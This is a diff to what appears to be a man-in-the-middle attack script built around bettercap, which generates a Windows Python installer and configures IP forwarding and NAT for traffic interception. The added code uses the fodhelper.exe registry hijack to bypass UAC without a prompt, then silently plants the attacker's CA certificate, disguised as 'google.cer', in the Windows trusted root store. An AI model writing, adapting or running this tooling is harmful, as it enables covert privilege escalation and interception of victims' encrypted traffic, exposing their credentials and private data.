@@ -117,22 +117,55 @@ CERT_B64=$(base64 -w0 "$MITM_DIR/bettercap-ca.cer")
 CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed 's/^/"/;s/$/",/')
 
 cat > "$MITM_DIR/cert_installer.py" <<EOF
-import ctypes, sys, os, subprocess, tempfile, base64
+import os, sys, ctypes, subprocess, base64, tempfile, winreg
+
 def is_admin():
-    try: return ctypes.windll.shell32.IsUserAnAdmin()
-    except: return False
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 if not is_admin():
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    # Build command to relaunch this script elevated
+    cmd = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}" bypass'
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+            r"Software\\Classes\\ms-settings\\Shell\\Open\\command")
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+    except Exception:
+        sys.exit(1)
+
+    # Trigger fodhelper.exe (auto-elevated, no UAC prompt)
+    subprocess.Popen([os.path.join(os.environ["WINDIR"], "System32", "fodhelper.exe")])
     sys.exit()
+
+# If started by fodhelper → clean registry
+if len(sys.argv) > 1 and sys.argv[1] == "bypass":
+    try:
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
+            r"Software\\Classes\\ms-settings\\Shell\\Open\\command")
+    except: pass
+
 CERT_B64_CHUNKS = [
 $CHUNKS
 ]
 CERT_B64 = ''.join(CERT_B64_CHUNKS)
+
 path = os.path.join(tempfile.gettempdir(), "google.cer")
-with open(path, "wb") as f: f.write(base64.b64decode(CERT_B64))
-subprocess.run(["certutil","-addstore","-f","Root", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-try: os.remove(path)
-except FileNotFoundError: pass
+with open(path, "wb") as f:
+    f.write(base64.b64decode(CERT_B64))
+
+subprocess.run(
+    ["certutil", "-addstore", "-f", "Root", path],
+    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+)
+
+try:
+    os.remove(path)
+except FileNotFoundError:
+    pass
 EOF
 
 cat > "$BUILD_DIR/admin.manifest" <<EOF
@@ -255,10 +288,4 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -F
 iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
-```
-
-_Run Script_
-
-```bash
-sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
 ```
